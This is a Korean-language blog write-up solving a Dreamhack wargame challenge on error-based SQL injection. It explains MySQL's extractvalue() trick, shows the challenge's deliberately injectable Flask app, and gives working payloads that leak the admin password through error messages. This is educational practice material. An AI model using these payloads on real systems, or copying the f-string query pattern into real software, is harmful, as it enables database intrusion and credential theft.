---
title: (6) Dreamhack error based sql injection 문제 풀이
date: 2024-01-11 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
Simple Error Based SQL Injection !

## Error Based Sqli
말 그대로 에러를 기반으로 sql injection을 하는 겁니다. 결과를 알려주지 않고 에러만 알려주는 못된(?) 사이트에서 쓸 수 있는 기법입니다.

### extractvalue()
extractvalue 함수는 XML 형식(1번째 인자)에서 XPath 조건식(2번째 인자)에 해당하는 값을 반환합니다.  
이때 extractvalue 함수로 XPath로 유효하지 않은 문자열을 넘겨준다면 이 값을 그대로 에러메세지에 출력합니다. 따라서 여기서 서브쿼리를 실행하고 결과를 extractvalue함수로 넣어준다면 에러메세지로 서브쿼리의 실행결과를 받아올 수 있습니다.  

sqli에 사용하기 위한 기본적인 형식은 다음과 같습니다.
```sql
extractvalue(1,concat(0x3a,('select * from user ...')))
```
1이라는 값에서 입력한 쿼리의 결과에 해당하는 XPath 조건을 찾는 다는데, 당연히 에러가 나겠죠. 애초에 XPath 조건 부터 제대로 주지 않을 겁니다.  
이걸 어떤 쿼리문 뒤에 붙여서 넘기면 에러가 뜨고 에러메세지에는 쿼리의 결과가 나올겁니다.

## 문제 풀이
![](https://kyuyeop.github.io/assets/img/post/6/1.png)
일단 사이트는 이렇게 생겼습니다. 아마 위에 있는 쿼리문이 실행되는것 같습니다.  
  
그럼 제공된 코드를 한번 살펴보겠습니다.
```python
# app.py
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
```sql
# init.sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```
이 init.sql이 실행되었다면 DB에는 이런 데이터가 들어가 있을 겁니다.
{% endraw %}
|uid|upw|
|:---:|:---:|
|admin|DH\{...\}|
|guest|guest|
|test|test|
{% raw %}
이번에는 flag를 탈취하기 위해 먼저 알아본 extractvalue 함수를 이용할 겁니다. admin의 upw값을 알고싶은 거기 때문에 결과를 알고싶은 쿼리 이렇게 될겁니다.
```sql
select upw from user where uid='admin'
```
이걸 extractvalue와 결합하면
```sql
extractvalue(1,concat(0x3a,(select upw from user where uid='admin')))
```
이렇게 될 겁니다.  
  
submit 버튼을 누르면 입력값인 uid에 따라
```sql
SELECT * FROM user WHERE uid='{uid}';
```
이런 쿼리문이 실행됩니다.  
  
따라서 uid에 아래와 같은 값을 넣어준다면
```
' AND extractvalue(1,concat(0x3a,(select upw from user where uid='admin')))-- 
```
실제로는
```sql
SELECT * FROM user WHERE uid='' AND extractvalue(1,concat(0x3a,(select upw from user where uid='admin')))-- ';

```
이런게 실행되어 버릴 겁니다. 에러가 나므로 당연히 try에서 expect로 빠질거고, 에러메세지가 그대로 출력될 겁니다.  
  
실제로도 그런지 테스트를 해보면
![](https://kyuyeop.github.io/assets/img/post/6/2.png)
flag가 출력되긴 했는데... 잘려서 나옵니다. 에러메세지가 너무 길어서 잘려서 출력되었습니다.  
  
이를 해결하기 위해서 substr을 사용할 겁니다. 일단 앞의 28자는 출력이 되었으므로 대충 25번째 부터 추가로 20글자 정도를 출력하도록 쿼리문을 수정해 보겠습니다.
```
' AND extractvalue(1,concat(0x3a,(select substr(upw,25,20) from user where uid='admin')))-- 
```
![](https://kyuyeop.github.io/assets/img/post/6/3.png)
이렇게 나머지 부분도 출력이 되어 flag를 획득했습니다.
{% endraw %}
